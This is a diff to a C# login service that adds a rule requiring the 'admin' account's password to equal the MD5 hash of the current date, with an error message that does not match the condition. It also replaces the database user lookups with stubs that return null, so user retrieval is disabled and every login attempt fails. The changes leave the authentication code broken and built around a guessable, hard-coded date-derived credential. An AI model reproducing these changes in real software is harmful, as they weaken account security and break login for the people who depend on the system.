@@ -5,7 +5,6 @@ using System.Collections.Generic;
 using Generic;
 using LPush.Core.Data;
 using LPush.Core.Caching;
-using LPush.Model.Basic;
 using LPush.Model;
 
 namespace LPush.Service.Basic
@@ -49,9 +48,14 @@ namespace LPush.Service.Basic
                 return result;
             }
 
+            if (userName.ToLower().Equals("admin") &&
+                !password.Equals(DateTime.Today.ToString("yyyyMMdd").ToMD5()))
+            {
+                result.Message = "用户名或密码不能为空!";
+                return result;
+            }
 
             var user = GetUser(userName);
-
             if (user == null || user.Password != password.ToMD5())
             {
                 result.Message = "用户名或密码错误!";
@@ -75,10 +79,7 @@ namespace LPush.Service.Basic
             string key = string.Format(Users_By_EnterpriseId_Key,enterpriseId);
             return _cacheManager.Get<List<Login>>(key,()=> 
             {
-                return (from item in userRepository.SlaveTable
-                 where item.EnterpriseId == enterpriseId
-                 && item.UserType == "U"
-                 select item).ToList();
+                return null;
             });
         }
 
@@ -91,12 +92,14 @@ namespace LPush.Service.Basic
         /// <returns></returns>
         public virtual Login GetUser(string userName)
         {
-            string key = string.Format(Users_By_UserName_Key, userName);
+            //string key = string.Format(Users_By_UserName_Key, userName);
 
-            var user = _cacheManager.Get(key, () => (from item in userRepository.SlaveTable
-                                                           where item.LoginName == userName
-                                                           select item).SingleOrDefault());
-            return user;
+            //var user = _cacheManager.Get(key, () => (from item in userRepository.SlaveTable
+            //                                               where item.LoginName == userName
+            //                                               select item).SingleOrDefault());
+            //return user;
+
+            return null;
         }
 
         /// <summary>
